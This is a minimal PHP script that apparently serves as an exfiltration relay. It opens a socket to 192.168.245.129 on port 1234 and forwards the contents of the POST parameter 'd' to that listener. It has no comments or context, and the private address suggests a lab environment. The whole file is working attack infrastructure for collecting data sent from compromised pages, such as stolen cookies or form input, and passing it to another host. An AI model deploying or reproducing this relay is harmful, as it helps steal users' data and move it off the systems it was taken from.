<?php
$fs=fsockopen("192.168.245.129", 1234, $errno, $errstr, 30);
fwrite($fs, $_POST["d"]);
fclose($fs);
?>

